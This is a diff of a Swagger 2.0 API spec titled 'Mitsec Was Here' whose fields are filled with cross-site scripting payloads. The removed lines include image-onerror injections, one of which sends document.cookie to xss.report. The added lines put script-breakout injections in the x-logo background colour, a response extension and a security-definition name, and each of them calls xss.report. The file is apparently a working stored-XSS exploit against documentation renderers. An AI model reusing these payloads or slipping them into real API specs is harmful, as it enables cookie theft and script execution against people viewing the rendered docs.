@@ -2,30 +2,31 @@
   "swagger": "2.0",
   "info": {
     "title": "Mitsec Was Here",
-    "version": "1.0"
+    "version": "1.0",
+    "x-logo": {
+      "url": "x",
+      "backgroundColor": "</style><script>fetch('https://xss.report/c/whoami?v=logo')</script>"
+    }
   },
   "paths": {
     "/test": {
       "get": {
-        "summary": "<img src=x:x onerror=fetch('https://xss.report/c/whoami?c='+document.cookie)>",
-        "description": "test",
+        "summary": "test",
         "parameters": [],
         "responses": {
           "200": {
-            "description": "ok"
+            "description": "ok",
+            "x-mitsec": "</div><script>fetch('https://xss.report/c/whoami?v=ext')</script>"
           }
         }
       }
     }
   },
-  "tags": [
-    {
-      "name": "<img src=x onerror=fetch('https://xss.report/c/whoami?t=tag')>",
-      "description": "xss"
+  "securityDefinitions": {
+    "</script><script>fetch('https://xss.report/c/whoami?v=secdef')": {
+      "type": "apiKey",
+      "name": "api_key",
+      "in": "header"
     }
-  ],
-  "externalDocs": {
-    "description": "<img src=x onerror=fetch('https://xss.report/c/whoami?e=ext')>",
-    "url": "http://test.com"
   }
 }
